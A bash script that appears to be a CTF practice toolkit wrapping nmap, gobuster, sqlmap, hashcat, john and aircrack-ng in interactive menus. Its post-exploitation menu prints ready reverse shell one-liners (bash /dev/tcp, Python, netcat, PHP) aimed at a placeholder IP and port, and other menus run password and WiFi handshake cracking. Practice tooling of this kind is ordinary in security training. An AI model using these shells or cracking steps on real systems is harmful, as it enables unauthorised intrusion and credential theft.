#!/bin/bash

# ==============================================
#            ByteCTF - CTF Toolkit
#   Author: YourName | Version: 1.0
# ==============================================
# 🔥 A powerful, modular bash script for CTFs 🔥
# ==============================================

# ---------------------------
#        COLOR CODES
# ---------------------------
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

# ---------------------------
#         BANNER
# ---------------------------
display_banner() {
    clear
    echo -e "${PURPLE}"
    echo " ██████╗ ██╗   ██╗████████╗███████╗     ██████╗████████╗███████╗"
    echo "██╔═══██╗╚██╗ ██╔╝╚══██╔══╝██╔════╝    ██╔════╝╚══██╔══╝██╔════╝"
    echo "██║   ██║ ╚████╔╝    ██║   █████╗      ██║        ██║   █████╗  "
    echo "██║   ██║  ╚██╔╝     ██║   ██╔══╝      ██║        ██║   ██╔══╝  "
    echo "╚██████╔╝   ██║      ██║   ███████╗    ╚██████╗   ██║   ███████╗"
    echo " ╚═════╝    ╚═╝      ╚═╝   ╚══════╝     ╚═════╝   ╚═╝   ╚══════╝"
    echo -e "${NC}"
    echo -e "${CYAN}           [ All-in-One CTF Toolkit for Hackers ]${NC}"
    echo -e "${YELLOW}---------------------------------------------------------${NC}"
    echo -e "${GREEN}  🔍 Scanning | 🎯 Exploitation | 🔓 Cracking | 📡 Post-Exploit${NC}"
    echo -e "${YELLOW}---------------------------------------------------------${NC}"
    echo ""
}

# ---------------------------
#   CHECK ROOT PRIVILEGES
# ---------------------------
check_root() {
    if [ "$(id -u)" -ne 0 ]; then
        echo -e "${RED}[✗] This tool requires root privileges. Run with 'sudo'.${NC}"
        exit 1
    fi
}

# ---------------------------
#   CHECK DEPENDENCIES
# ---------------------------
check_dependencies() {
    required_tools=("nmap" "gobuster" "sqlmap" "hashcat" "john" "nikto" "dnsenum" "aircrack-ng")
    missing_tools=()

    echo -e "${BLUE}[*] Checking required tools...${NC}"

    for tool in "${required_tools[@]}"; do
        if ! command -v "$tool" &> /dev/null; then
            missing_tools+=("$tool")
            echo -e "${RED}[-] Missing: $tool${NC}"
        else
            echo -e "${GREEN}[✓] $tool${NC}"
        fi
    done

    if [ ${#missing_tools[@]} -gt 0 ]; then
        echo -e "${YELLOW}[!] Some tools are missing. Install them first.${NC}"
        read -p "Do you want to install missing tools? (y/n): " choice
        if [[ "$choice" =~ ^[Yy]$ ]]; then
            install_tools
        else
            echo -e "${RED}[✗] Exiting. Install dependencies manually.${NC}"
            exit 1
        fi
    fi
}

# ---------------------------
#   INSTALL MISSING TOOLS
# ---------------------------
install_tools() {
    echo -e "${BLUE}[*] Installing missing tools...${NC}"
    
    if command -v apt &> /dev/null; then
        sudo apt update && sudo apt install -y nmap gobuster sqlmap hashcat john nikto dnsenum aircrack-ng
    elif command -v yum &> /dev/null; then
        sudo yum install -y nmap gobuster sqlmap hashcat john nikto dnsenum aircrack-ng
    elif command -v pacman &> /dev/null; then
        sudo pacman -Syu --noconfirm nmap gobuster sqlmap hashcat john nikto dnsenum aircrack-ng
    else
        echo -e "${RED}[✗] Unsupported package manager. Install manually.${NC}"
        exit 1
    fi
    
    echo -e "${GREEN}[✓] Installation complete!${NC}"
    sleep 2
}

# ---------------------------
#   MAIN MENU
# ---------------------------
main_menu() {
    while true; do
        display_banner
        echo -e "${YELLOW}╔════════════════════════════════════════╗${NC}"
        echo -e "${YELLOW}║           ${PURPLE}MAIN MENU${YELLOW}                     ║${NC}"
        echo -e "${YELLOW}╠════════════════════════════════════════╣${NC}"
        echo -e "${YELLOW}║ ${GREEN}1. Network Scanning${NC}                         ║"
        echo -e "${YELLOW}║ ${GREEN}2. Port Scanning & Enumeration${NC}              ║"
        echo -e "${YELLOW}║ ${GREEN}3. Web Application Testing${NC}                  ║"
        echo -e "${YELLOW}║ ${GREEN}4. Password Cracking${NC}                        ║"
        echo -e "${YELLOW}║ ${GREEN}5. Wireless Attacks${NC}                         ║"
        echo -e "${YELLOW}║ ${GREEN}6. Post-Exploitation${NC}                        ║"
        echo -e "${YELLOW}║ ${RED}7. Exit${NC}                                      ║"
        echo -e "${YELLOW}╚════════════════════════════════════════╝${NC}"
        echo ""
        read -p "Select an option (1-7): " choice

        case "$choice" in
            1) network_scanning ;;
            2) port_scanning ;;
            3) web_app_testing ;;
            4) password_cracking ;;
            5) wireless_attacks ;;
            6) post_exploitation ;;
            7) echo -e "${GREEN}[✓] Exiting ByteCTF. Happy Hacking!${NC}"; exit 0 ;;
            *) echo -e "${RED}[✗] Invalid option!${NC}"; sleep 1 ;;
        esac
    done
}

# ---------------------------
#   NETWORK SCANNING
# ---------------------------
network_scanning() {
    while true; do
        display_banner
        echo -e "${YELLOW}╔════════════════════════════════════════╗${NC}"
        echo -e "${YELLOW}║          ${PURPLE}NETWORK SCANNING${YELLOW}               ║${NC}"
        echo -e "${YELLOW}╠════════════════════════════════════════╣${NC}"
        echo -e "${YELLOW}║ ${GREEN}1. Ping Sweep (Nmap)${NC}                        ║"
        echo -e "${YELLOW}║ ${GREEN}2. ARP Scan (arp-scan)${NC}                      ║"
        echo -e "${YELLOW}║ ${GREEN}3. DNS Enumeration (dnsenum)${NC}               ║"
        echo -e "${YELLOW}║ ${RED}4. Back to Main Menu${NC}                         ║"
        echo -e "${YELLOW}╚════════════════════════════════════════╝${NC}"
        echo ""
        read -p "Select an option (1-4): " choice

        case "$choice" in
            1)
                read -p "Enter target IP range (e.g., 192.168.1.0/24): " target
                echo -e "${BLUE}[*] Running Ping Sweep...${NC}"
                nmap -sn "$target" -oN ping_sweep.txt
                echo -e "${GREEN}[✓] Results saved to ping_sweep.txt${NC}"
                sleep 2
                ;;
            2)
                read -p "Enter network interface (e.g., eth0): " interface
                echo -e "${BLUE}[*] Running ARP Scan...${NC}"
                arp-scan --localnet --interface="$interface"
                sleep 3
                ;;
            3)
                read -p "Enter domain to enumerate: " domain
                echo -e "${BLUE}[*] Running DNS Enumeration...${NC}"
                dnsenum "$domain" --output dns_results.txt
                echo -e "${GREEN}[✓] Results saved to dns_results.txt${NC}"
                sleep 2
                ;;
            4) return ;;
            *) echo -e "${RED}[✗] Invalid option!${NC}"; sleep 1 ;;
        esac
    done
}

# ---------------------------
#   PORT SCANNING
# ---------------------------
port_scanning() {
    while true; do
        display_banner
        echo -e "${YELLOW}╔════════════════════════════════════════╗${NC}"
        echo -e "${YELLOW}║        ${PURPLE}PORT SCANNING${YELLOW}                   ║${NC}"
        echo -e "${YELLOW}╠════════════════════════════════════════╣${NC}"
        echo -e "${YELLOW}║ ${GREEN}1. Quick Scan (Top 100 Ports)${NC}              ║"
        echo -e "${YELLOW}║ ${GREEN}2. Full Port Scan${NC}                          ║"
        echo -e "${YELLOW}║ ${GREEN}3. Service Version Detection${NC}               ║"
        echo -e "${YELLOW}║ ${GREEN}4. Vulnerability Scan${NC}                      ║"
        echo -e "${YELLOW}║ ${RED}5. Back to Main Menu${NC}                        ║"
        echo -e "${YELLOW}╚════════════════════════════════════════╝${NC}"
        echo ""
        read -p "Select an option (1-5): " choice

        case "$choice" in
            1)
                read -p "Enter target IP/hostname: " target
                echo -e "${BLUE}[*] Running Quick Scan...${NC}"
                nmap -T4 -F "$target" -oN quick_scan.txt
                echo -e "${GREEN}[✓] Results saved to quick_scan.txt${NC}"
                sleep 2
                ;;
            2)
                read -p "Enter target IP/hostname: " target
                echo -e "${BLUE}[*] Running Full Port Scan...${NC}"
                nmap -T4 -p- "$target" -oN full_scan.txt
                echo -e "${GREEN}[✓] Results saved to full_scan.txt${NC}"
                sleep 2
                ;;
            3)
                read -p "Enter target IP/hostname: " target
                echo -e "${BLUE}[*] Running Service Detection...${NC}"
                nmap -sV "$target" -oN service_scan.txt
                echo -e "${GREEN}[✓] Results saved to service_scan.txt${NC}"
                sleep 2
                ;;
            4)
                read -p "Enter target IP/hostname: " target
                echo -e "${BLUE}[*] Running Vulnerability Scan...${NC}"
                nmap --script vuln "$target" -oN vuln_scan.txt
                echo -e "${GREEN}[✓] Results saved to vuln_scan.txt${NC}"
                sleep 2
                ;;
            5) return ;;
            *) echo -e "${RED}[✗] Invalid option!${NC}"; sleep 1 ;;
        esac
    done
}

# ---------------------------
#   WEB APP TESTING
# ---------------------------
web_app_testing() {
    while true; do
        display_banner
        echo -e "${YELLOW}╔════════════════════════════════════════╗${NC}"
        echo -e "${YELLOW}║        ${PURPLE}WEB APP TESTING${YELLOW}                 ║${NC}"
        echo -e "${YELLOW}╠════════════════════════════════════════╣${NC}"
        echo -e "${YELLOW}║ ${GREEN}1. Directory Bruteforce (Gobuster)${NC}         ║"
        echo -e "${YELLOW}║ ${GREEN}2. SQL Injection Test (SQLmap)${NC}             ║"
        echo -e "${YELLOW}║ ${GREEN}3. XSS Scanner (XSStrike)${NC}                  ║"
        echo -e "${YELLOW}║ ${RED}4. Back to Main Menu${NC}                        ║"
        echo -e "${YELLOW}╚════════════════════════════════════════╝${NC}"
        echo ""
        read -p "Select an option (1-4): " choice

        case "$choice" in
            1)
                read -p "Enter target URL (e.g., http://example.com): " url
                read -p "Enter wordlist path (default: /usr/share/wordlists/dirb/common.txt): " wordlist
                wordlist=${wordlist:-/usr/share/wordlists/dirb/common.txt}
                echo -e "${BLUE}[*] Running Directory Bruteforce...${NC}"
                gobuster dir -u "$url" -w "$wordlist" -o dir_scan.txt
                echo -e "${GREEN}[✓] Results saved to dir_scan.txt${NC}"
                sleep 2
                ;;
            2)
                read -p "Enter vulnerable URL (e.g., http://example.com/page?id=1): " url
                echo -e "${BLUE}[*] Testing for SQL Injection...${NC}"
                sqlmap -u "$url" --batch --output-dir=sqlmap_results
                echo -e "${GREEN}[✓] Results saved in sqlmap_results/ directory${NC}"
                sleep 2
                ;;
            3)
                read -p "Enter target URL (e.g., http://example.com/search?q=test): " url
                echo -e "${BLUE}[*] Scanning for XSS...${NC}"
                xsstrike -u "$url" --output xss_results.txt
                echo -e "${GREEN}[✓] Results saved to xss_results.txt${NC}"
                sleep 2
                ;;
            4) return ;;
            *) echo -e "${RED}[✗] Invalid option!${NC}"; sleep 1 ;;
        esac
    done
}

# ---------------------------
#   PASSWORD CRACKING
# ---------------------------
password_cracking() {
    while true; do
        display_banner
        echo -e "${YELLOW}╔════════════════════════════════════════╗${NC}"
        echo -e "${YELLOW}║        ${PURPLE}PASSWORD CRACKING${YELLOW}               ║${NC}"
        echo -e "${YELLOW}╠════════════════════════════════════════╣${NC}"
        echo -e "${YELLOW}║ ${GREEN}1. Hash Identification (hashid)${NC}            ║"
        echo -e "${YELLOW}║ ${GREEN}2. John the Ripper (Bruteforce)${NC}            ║"
        echo -e "${YELLOW}║ ${GREEN}3. Hashcat (GPU Cracking)${NC}                  ║"
        echo -e "${YELLOW}║ ${RED}4. Back to Main Menu${NC}                        ║"
        echo -e "${YELLOW}╚════════════════════════════════════════╝${NC}"
        echo ""
        read -p "Select an option (1-4): " choice

        case "$choice" in
            1)
                read -p "Enter hash to identify: " hash
                echo -e "${BLUE}[*] Identifying hash type...${NC}"
                hashid "$hash"
                sleep 2
                ;;
            2)
                read -p "Enter hash file path: " hashfile
                read -p "Enter wordlist (default: rockyou.txt): " wordlist
                wordlist=${wordlist:-/usr/share/wordlists/rockyou.txt}
                echo -e "${BLUE}[*] Running John the Ripper...${NC}"
                john --format=auto --wordlist="$wordlist" "$hashfile"
                echo -e "${GREEN}[✓] Cracked passwords:${NC}"
                john --show "$hashfile"
                sleep 3
                ;;
            3)
                read -p "Enter hash file path: " hashfile
                read -p "Enter hash type (e.g., 0=MD5, 1000=NTLM): " hashtype
                read -p "Enter wordlist (default: rockyou.txt): " wordlist
                wordlist=${wordlist:-/usr/share/wordlists/rockyou.txt}
                echo -e "${BLUE}[*] Running Hashcat...${NC}"
                hashcat -m "$hashtype" -a 0 "$hashfile" "$wordlist" --force
                echo -e "${GREEN}[✓] Cracked passwords:${NC}"
                hashcat -m "$hashtype" "$hashfile" --show
                sleep 3
                ;;
            4) return ;;
            *) echo -e "${RED}[✗] Invalid option!${NC}"; sleep 1 ;;
        esac
    done
}

# ---------------------------
#   WIRELESS ATTACKS
# ---------------------------
wireless_attacks() {
    while true; do
        display_banner
        echo -e "${YELLOW}╔════════════════════════════════════════╗${NC}"
        echo -e "${YELLOW}║        ${PURPLE}WIRELESS ATTACKS${YELLOW}                ║${NC}"
        echo -e "${YELLOW}╠════════════════════════════════════════╣${NC}"
        echo -e "${YELLOW}║ ${GREEN}1. Scan for WiFi Networks (airodump-ng)${NC}     ║"
        echo -e "${YELLOW}║ ${GREEN}2. Capture Handshake${NC}                        ║"
        echo -e "${YELLOW}║ ${GREEN}3. Crack WiFi Handshake (aircrack-ng)${NC}      ║"
        echo -e "${YELLOW}║ ${RED}4. Back to Main Menu${NC}                        ║"
        echo -e "${YELLOW}╚════════════════════════════════════════╝${NC}"
        echo ""
        read -p "Select an option (1-4): " choice

        case "$choice" in
            1)
                read -p "Enter wireless interface (e.g., wlan0): " interface
                echo -e "${BLUE}[*] Scanning for WiFi networks...${NC}"
                sudo airodump-ng "$interface"
                sleep 3
                ;;
            2)
                read -p "Enter wireless interface (e.g., wlan0): " interface
                read -p "Enter target BSSID: " bssid
                read -p "Enter channel: " channel
                read -p "Enter output filename (without extension): " output
                echo -e "${BLUE}[*] Capturing handshake...${NC}"
                sudo airodump-ng --bssid "$bssid" -c "$channel" -w "$output" "$interface"
                echo -e "${YELLOW}[!] Wait for handshake capture (Ctrl+C when done)${NC}"
                ;;
            3)
                read -p "Enter handshake file (.cap): " capfile
                read -p "Enter wordlist (default: rockyou.txt): " wordlist
                wordlist=${wordlist:-/usr/share/wordlists/rockyou.txt}
                echo -e "${BLUE}[*] Cracking handshake...${NC}"
                aircrack-ng "$capfile" -w "$wordlist"
                sleep 3
                ;;
            4) return ;;
            *) echo -e "${RED}[✗] Invalid option!${NC}"; sleep 1 ;;
        esac
    done
}

# ---------------------------
#   POST-EXPLOITATION
# ---------------------------
post_exploitation() {
    while true; do
        display_banner
        echo -e "${YELLOW}╔════════════════════════════════════════╗${NC}"
        echo -e "${YELLOW}║        ${PURPLE}POST-EXPLOITATION${YELLOW}               ║${NC}"
        echo -e "${YELLOW}╠════════════════════════════════════════╣${NC}"
        echo -e "${YELLOW}║ ${GREEN}1. Reverse Shell Generator${NC}                  ║"
        echo -e "${YELLOW}║ ${GREEN}2. Privilege Escalation Check${NC}               ║"
        echo -e "${YELLOW}║ ${RED}3. Back to Main Menu${NC}                        ║"
        echo -e "${YELLOW}╚════════════════════════════════════════╝${NC}"
        echo ""
        read -p "Select an option (1-3): " choice

        case "$choice" in
            1)
                echo -e "\n${BLUE}[*] Reverse Shell Cheat Sheet${NC}"
                echo -e "${GREEN}Bash:${NC} bash -i >& /dev/tcp/IP/PORT 0>&1"
                echo -e "${GREEN}Python:${NC} python -c 'import socket,os,pty;s=socket.socket();s.connect((\"IP\",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")'"
                echo -e "${GREEN}Netcat:${NC} nc -e /bin/sh IP PORT"
                echo -e "${GREEN}PHP:${NC} php -r '\$sock=fsockopen(\"IP\",PORT);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
                sleep 5
                ;;
            2)
                echo -e "${BLUE}[*] Checking for privilege escalation...${NC}"
                echo -e "${YELLOW}[!] Linux: Check /etc/passwd, SUID, Sudo rights${NC}"
                echo -e "${YELLOW}[!] Windows: Check AlwaysInstallElevated, Unquoted Paths${NC}"
                sleep 3
                ;;
            3) return ;;
            *) echo -e "${RED}[✗] Invalid option!${NC}"; sleep 1 ;;
        esac
    done
}

# ---------------------------
#   INITIALIZE
# ---------------------------
check_root
check_dependencies
main_menu
